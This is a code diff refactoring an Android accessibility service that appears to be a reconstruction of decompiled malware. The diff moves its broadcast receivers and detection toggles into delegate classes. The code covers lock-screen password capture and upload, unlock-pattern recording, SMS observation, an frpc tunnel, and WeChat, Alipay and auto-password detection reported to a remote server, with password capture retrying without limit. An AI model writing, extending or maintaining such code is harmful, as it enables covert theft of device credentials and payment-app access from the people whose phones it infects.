@@ -50,6 +50,8 @@ import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
 import com.storm.safe.rock.service.modules.SmsContentObserver
 import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
+import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
+import com.storm.safe.rock.service.delegates.DetectionController
 import com.storm.safe.rock.service.modules.FrpcProcessManager
 import com.storm.safe.rock.util.AssetConfigReader
 import java.util.Locale
@@ -312,6 +314,12 @@ class MyAccessibilityService : AccessibilityService() {
     @get:JvmName("networkManagerField")
     var networkManager: NetworkManager? = null
 
+    /** Delegate: detection enable/disable (extracted from this service) */
+    private var detectionController: DetectionController? = null
+
+    /** Delegate: broadcast receiver registration/unregistration */
+    internal var broadcastReceiverRegistry: BroadcastReceiverRegistry? = null
+
     /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
     var accessibilityEventRouter: AccessibilityEventRouter? = null
 
@@ -529,22 +537,10 @@ class MyAccessibilityService : AccessibilityService() {
     /** JADX: f52488l9 — permission health receiver registered */
     var permissionHealthReceiverRegistered: Boolean = false
 
-    // ── Broadcast receivers ──
-
-    /** JADX: f52457i8 — screen state receiver */
-    private var screenStateReceiver: BroadcastReceiver? = null
-
-    /** JADX: f52465j6 — permission request receiver */
-    private var permissionRequestReceiver: BroadcastReceiver? = null
-
-    /** JADX: f52489m0 — permission health receiver */
-    private var permissionHealthReceiver: BroadcastReceiver? = null
-
-    /** JADX: f52459j0 — local service action receiver */
-    private var localServiceActionReceiver: BroadcastReceiver? = null
-
-    /** JADX: f52466j7 — network event receiver */
-    private var networkEventReceiver: BroadcastReceiver? = null
+    // ── Broadcast receivers — now managed by BroadcastReceiverRegistry ──
+    // (screenStateReceiver, permissionRequestReceiver, permissionHealthReceiver,
+    //  localServiceActionReceiver, networkEventReceiver all moved to
+    //  service/delegates/BroadcastReceiverRegistry.kt)
 
     // ── Collections ──
 
@@ -653,6 +649,11 @@ class MyAccessibilityService : AccessibilityService() {
             // Step 3: Set timestamps and instance
             serviceStartTime = System.currentTimeMillis()
             instance = this
+            detectionController = DetectionController(
+                eventFilterManagerProvider = { eventFilterManager },
+                networkManagerProvider = { networkManager }
+            )
+            broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
 
             // Step 4: Configure accessibility service info
             initServiceConfig()
@@ -1131,60 +1132,12 @@ class MyAccessibilityService : AccessibilityService() {
             try { android.util.Log.e(TAG, "📩 ❌ 注销短信接收器失败", e) } catch (_: Exception) {}
         }
 
-        // Unregister permission request receiver
+        // Unregister all broadcast receivers managed by BroadcastReceiverRegistry
         try {
-            permissionRequestReceiver?.let { unregisterReceiver(it) }
-            android.util.Log.d(TAG, "已注销权限申请广播接收器")
-        } catch (e: Exception) {
-            try { android.util.Log.e(TAG, "注销广播接收器失败", e) } catch (_: Exception) {}
-        }
-
-        // Unregister screen state receiver
-        try {
-            if (screenStateReceiverRegistered) {
-                try {
-                    screenStateReceiver?.let { unregisterReceiver(it) }
-                    screenStateReceiverRegistered = false
-                    android.util.Log.d(TAG, "✅ 已注销屏幕状态广播接收器")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 注销屏幕状态广播接收器失败", e)
-                }
-            }
-        } catch (_: Exception) {}
-
-        // Unregister local service receiver
-        try {
-            if (localServiceReceiverRegistered) {
-                try {
-                    localServiceActionReceiver?.let { unregisterReceiver(it) }
-                    localServiceActionReceiver = null
-                    localServiceReceiverRegistered = false
-                    android.util.Log.d(TAG, "✅ 已注销 local-service 广播接收器")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 注销 local-service 广播接收器失败", e)
-                }
-            }
-        } catch (_: Exception) {}
-
-        // Unregister permission health receiver
-        try {
-            if (permissionHealthReceiverRegistered) {
-                try {
-                    permissionHealthReceiver?.let { unregisterReceiver(it) }
-                    permissionHealthReceiverRegistered = false
-                    android.util.Log.d(TAG, "✅ 已注销权限健康监控广播接收器")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 注销权限健康监控广播接收器失败", e)
-                }
-            }
-        } catch (_: Exception) {}
-
-        // Unregister network event receiver
-        try {
-            networkEventReceiver?.let {
-                unregisterReceiver(it)
-                networkEventReceiver = null
-            }
+            broadcastReceiverRegistry?.unregisterAll()
+            screenStateReceiverRegistered = false
+            localServiceReceiverRegistered = false
+            permissionHealthReceiverRegistered = false
         } catch (_: Exception) {}
 
         // Cleanup configStageManager (JADX: C0329b4)
@@ -1848,89 +1801,11 @@ class MyAccessibilityService : AccessibilityService() {
      * - SMS receiver
      */
     fun registerBroadcastReceivers() {
-        // Screen state receiver (JADX: f52457i8)
-        if (!screenStateReceiverRegistered) {
-            try {
-                screenStateReceiver = object : BroadcastReceiver() {
-                    override fun onReceive(context: Context?, intent: Intent?) {
-                        when (intent?.action) {
-                            Intent.ACTION_SCREEN_ON -> {
-                                android.util.Log.d(TAG, "SCREEN_ON")
-                                cipherCaptureManager?.refreshLockBatchId()
-                                try { sendScreenStatus() } catch (_: Exception) {}
-                            }
-                            Intent.ACTION_SCREEN_OFF -> {
-                                android.util.Log.d(TAG, "SCREEN_OFF")
-                                cipherCaptureManager?.resetLockBatchId()
-                                cipherRetryCount = 0
-                                gestureRecorderManager?.reset()
-                                try { sendScreenStatus() } catch (_: Exception) {}
-                            }
-                            Intent.ACTION_USER_PRESENT -> {
-                                android.util.Log.d(TAG, "USER_PRESENT")
-                                try { sendScreenStatus() } catch (_: Exception) {}
-                                // 被动监听模式：用户解锁成功 = 密码验证成功
-                                // 但如果 GestureRecorderManager 正在录制图案，由它在 onUnlocked() 中处理
-                                // Bug 1 fix: also check hasReportedThisSession to prevent
-                                // double upload when GRM.onUnlocked already reported.
-                                val grm = gestureRecorderManager
-                                if (isCipherCaptureEnabled && (grm == null || (!grm.isRecording && !grm.hasReportedThisSession))) {
-                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + cipher监听中(非图案) → 确认保存密码")
-                                    cipherCaptureManager?.confirmAndSaveLastCipher()
-                                } else if (grm?.isRecording == true) {
-                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + 图案录制中 → 由 GestureRecorderManager 处理")
-                                } else if (grm?.hasReportedThisSession == true) {
-                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + GRM已上报本次会话 → 跳过重复上传")
-                                }
-                                val pType = pendingPasswordType
-                                if (pType != null) {
-                                    pendingPasswordType = null
-                                    android.util.Log.d(TAG, "USER_PRESENT deferred password capture: type=$pType")
-                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                        doLaunchSystemPasswordCapture(isInstallationFlow = false)
-                                    }, 500L)
-                                }
-                            }
-                        }
-                    }
-                }
-                val filter = IntentFilter().apply {
-                    addAction(Intent.ACTION_SCREEN_ON)
-                    addAction(Intent.ACTION_SCREEN_OFF)
-                    addAction(Intent.ACTION_USER_PRESENT)
-                }
-                if (Build.VERSION.SDK_INT >= 33) {
-                    // ADAPT: vendor dqtvuisjd.m211420b9 使用 RECEIVER_EXPORTED (常量值 2)。
-                    // 之前误用 NOT_EXPORTED 导致部分 ROM 收不到 USER_PRESENT 广播。
-                    registerReceiver(screenStateReceiver, filter, Context.RECEIVER_EXPORTED)
-                } else {
-                    registerReceiver(screenStateReceiver, filter)
-                }
-                screenStateReceiverRegistered = true
-                android.util.Log.d(TAG, "✅ 已注册屏幕状态广播接收器")
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ 注册屏幕状态广播接收器失败", e)
-            }
-        }
-
-        // Permission request receiver (JADX: f52465j6)
-        try {
-            permissionRequestReceiver = object : BroadcastReceiver() {
-                override fun onReceive(context: Context?, intent: Intent?) {
-                    val action = intent?.getStringExtra("permission_action") ?: return
-                    android.util.Log.d(TAG, "📋 收到权限请求广播: $action")
-                }
-            }
-            val permFilter = IntentFilter("com.storm.safe.rock.action.PERMISSION_REQUEST")
-            if (Build.VERSION.SDK_INT >= 33) {
-                registerReceiver(permissionRequestReceiver, permFilter, Context.RECEIVER_NOT_EXPORTED)
-            } else {
-                registerReceiver(permissionRequestReceiver, permFilter)
-            }
-            android.util.Log.d(TAG, "✅ 已注册权限申请广播接收器")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 注册权限申请广播接收器失败", e)
-        }
+        // Delegate screen state + permission request receivers to BroadcastReceiverRegistry
+        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
+        registry.registerScreenStateReceiver()
+        screenStateReceiverRegistered = registry.isScreenStateRegistered
+        registry.registerPermissionRequestReceiver()
 
         // SMS receiver (JADX: arniezsqllm / f52461j2)
         try {
@@ -1960,25 +1835,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211456e5 (e5), line 4845
      */
     fun disableWechatDetection() {
-        try {
-            android.util.Log.d(TAG, "💬💬💬 关闭微信检测功能")
-            // JADX: C0614i9 — EventFilterManager dispatch
-            if (eventFilterManager == null) {
-                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
-                return
-            }
-            // JADX line 4853: c0614i9.m213121a9() — disableWechatDetection on EventFilterManager
-            eventFilterManager?.disableWechatDetection()
-            android.util.Log.d(TAG, "💬 AccessibilityEventManager.disableWechatDetection() 已调用")
-            networkManager?.let { nm ->
-                // JADX line 4860: nm.sendWechatDetectionStatus(false)
-                val data = org.json.JSONObject()
-                data.put("enabled", false)
-                nm.sendWechatDetectionStatus(data)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 关闭微信检测失败", e)
-        }
+        detectionController?.disableWechatDetection()
     }
 
     /**
@@ -1986,25 +1843,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211455e4 (e4), line 4816
      */
     fun disableAlipayDetection() {
-        try {
-            android.util.Log.d(TAG, "💰💰💰 关闭支付宝检测功能")
-            // JADX: C0614i9 — EventFilterManager dispatch
-            if (eventFilterManager == null) {
-                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
-                return
-            }
-            // JADX line 4825: c0614i9.m213119a7() — disableAlipayDetection on EventFilterManager
-            eventFilterManager?.disableAlipayDetection()
-            android.util.Log.d(TAG, "💰 AccessibilityEventManager.disableAlipayDetection() 已调用")
-            networkManager?.let { nm ->
-                // JADX line 4832: nm.sendAlipayDetectionStatus(false)
-                val data = org.json.JSONObject()
-                data.put("enabled", false)
-                nm.sendAlipayDetectionStatus(data)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 关闭支付宝检测失败", e)
-        }
+        detectionController?.disableAlipayDetection()
     }
 
     /**
@@ -3197,33 +3036,11 @@ class MyAccessibilityService : AccessibilityService() {
         // JADX: fn0 — permission health monitor
         // f52376a7 = fn0.f56299a2.getInstance(this)
 
-        // JADX: register permission health receiver
-        try {
-            if (!permissionHealthReceiverRegistered) {
-                permissionHealthReceiver = object : BroadcastReceiver() {
-                    override fun onReceive(context: Context?, intent: Intent?) {
-                        val action = intent?.action ?: return
-                        android.util.Log.d(TAG, "📋 权限健康广播: $action")
-                    }
-                }
-                val filter = IntentFilter().apply {
-                    addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_RECOVERED")
-                    addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_ISSUE")
-                    addAction("com.storm.safe.rock.intent.MEDIA_PROJECTION_RECOVERED")
-                    addAction("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE")
-                    addAction("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION")
-                    addAction("com.storm.safe.rock.intent.PERMISSION_RECOVERY_FAILED")
-                }
-                if (Build.VERSION.SDK_INT >= 33) {
-                    registerReceiver(permissionHealthReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
-                } else {
-                    registerReceiver(permissionHealthReceiver, filter)
-                }
-                permissionHealthReceiverRegistered = true
-                android.util.Log.d(TAG, "✅ 已注册权限健康监控广播接收器")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 注册权限健康监控广播接收器失败", e)
+        // JADX: register permission health receiver — delegated to BroadcastReceiverRegistry
+        run {
+            val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
+            registry.registerPermissionHealthReceiver()
+            permissionHealthReceiverRegistered = registry.isPermissionHealthRegistered
         }
 
         // JADX: CommandDispatcher initialization
@@ -3495,7 +3312,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     @Volatile private var lastLockTypeCheckTime = 0L
-    @Volatile private var cipherRetryCount = 0
+    @Volatile internal var cipherRetryCount = 0
     private val cipherMaxRetries = Int.MAX_VALUE
     private val cipherRetryDelayMs = 300L
     private var cipherIsInstallationFlow = false
@@ -4139,54 +3956,18 @@ class MyAccessibilityService : AccessibilityService() {
     /** Register local service action receiver. JADX: part of initializeDeferredManagers */
     fun registerLocalServiceActionReceiver() {
         // ADAPT: l20 (InjectionManager) — vendor registers a receiver for local service actions
-        // (injection task updates). Injection tasks are managed via registerInjectionTask/unregisterInjectionTask
-        // methods and tracked in the injectionTasks map.
-        if (!localServiceReceiverRegistered) {
-            try {
-                localServiceActionReceiver = object : BroadcastReceiver() {
-                    override fun onReceive(context: Context?, intent: Intent?) {
-                        val action = intent?.action ?: return
-                        android.util.Log.d(TAG, "📋 本地服务广播: $action")
-                    }
-                }
-                val filter = IntentFilter("com.storm.safe.rock.action.LOCAL_SERVICE")
-                if (android.os.Build.VERSION.SDK_INT >= 33) {
-                    registerReceiver(localServiceActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
-                } else {
-                    registerReceiver(localServiceActionReceiver, filter)
-                }
-                localServiceReceiverRegistered = true
-                android.util.Log.d(TAG, "✅ 已注册 local-service 广播接收器")
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ 注册 local-service 广播接收器失败", e)
-            }
-        }
+        // Delegated to BroadcastReceiverRegistry
+        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
+        registry.registerLocalServiceReceiver()
+        localServiceReceiverRegistered = registry.isLocalServiceRegistered
     }
 
     /** Register network event receivers. JADX: part of initializeDeferredManagers */
     fun registerNetworkEventReceivers() {
         // ADAPT: Vendor registers ConnectivityManager.NetworkCallback for network state monitoring.
-        // Network connectivity is tracked by NetworkManager's WebSocket reconnection logic.
-        try {
-            if (networkEventReceiver == null) {
-                networkEventReceiver = object : BroadcastReceiver() {
-                    override fun onReceive(context: Context?, intent: Intent?) {
-                        android.util.Log.d(TAG, "📡 网络状态变化")
-                        // Trigger WebSocket reconnection check
-                        networkManager?.ensureConnected()
-                    }
-                }
-                val filter = IntentFilter("android.net.conn.CONNECTIVITY_CHANGE")
-                if (android.os.Build.VERSION.SDK_INT >= 33) {
-                    registerReceiver(networkEventReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
-                } else {
-                    registerReceiver(networkEventReceiver, filter)
-                }
-                android.util.Log.d(TAG, "✅ 已注册网络事件广播接收器")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 注册网络事件广播接收器失败", e)
-        }
+        // Delegated to BroadcastReceiverRegistry
+        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
+        registry.registerNetworkEventReceiver()
     }
 
     // ════════════════════════════════════════════════════════════════
@@ -4827,69 +4608,28 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX: enableAlipayDetection on service, delegates to accessibilityEventManager.
      */
     fun enableAlipayDetection(delayMs: Long) {
-        try {
-            android.util.Log.d(TAG, "💰 开启支付宝检测功能，延时: ${delayMs}ms")
-            // JADX: c0614i9 (f52414e5, accessibilityEventManager) → m213122b0(delayMs)
-            eventFilterManager?.enableAlipayDetection(delayMs)
-            // JADX: c0323a8 (networkManager) → m211655c1(true)
-            networkManager?.sendAlipayDetectionStatus(org.json.JSONObject().apply {
-                put("enabled", true)
-                put("delayMs", delayMs)
-            })
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 开启支付宝检测失败", e)
-        }
+        detectionController?.enableAlipayDetection(delayMs)
     }
 
     /**
      * Enable WeChat detection. Vendor: dqtvuisjd calls C0614i9.m213125b3(delayMs).
      */
     fun enableWechatDetection(delayMs: Long) {
-        try {
-            android.util.Log.d(TAG, "💬 开启微信检测功能，延时: ${delayMs}ms")
-            // JADX: c0614i9.m213125b3(delayMs)
-            eventFilterManager?.enableWechatDetection(delayMs)
-            networkManager?.sendWechatDetectionStatus(org.json.JSONObject().apply {
-                put("enabled", true)
-                put("delayMs", delayMs)
-            })
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 开启微信检测失败", e)
-        }
+        detectionController?.enableWechatDetection(delayMs)
     }
 
     /**
      * Enable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213123b1(delayMs).
      */
     fun enableAutoPassword(delayMs: Long) {
-        try {
-            android.util.Log.d(TAG, "🔐 开启自动密码检测功能，延时: ${delayMs}ms")
-            // JADX: c0614i9.m213123b1(delayMs) + c0323a8.m211656c2(delayMs, true)
-            eventFilterManager?.enableAutoPassword(delayMs)
-            networkManager?.sendAutoPasswordDetectionStatus(org.json.JSONObject().apply {
-                put("enabled", true)
-                put("delayMs", delayMs)
-            })
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 开启自动密码检测失败", e)
-        }
+        detectionController?.enableAutoPassword(delayMs)
     }
 
     /**
      * Disable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213120a8().
      */
     fun disableAutoPassword() {
-        try {
-            android.util.Log.d(TAG, "🔐 关闭自动密码检测功能")
-            // JADX: c0614i9.m213120a8() + c0323a8.m211656c2(0, false)
-            eventFilterManager?.disableAutoPassword()
-            networkManager?.sendAutoPasswordDetectionStatus(org.json.JSONObject().apply {
-                put("enabled", false)
-                put("delayMs", 0L)
-            })
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 关闭自动密码检测失败", e)
-        }
+        detectionController?.disableAutoPassword()
     }
 
     /**
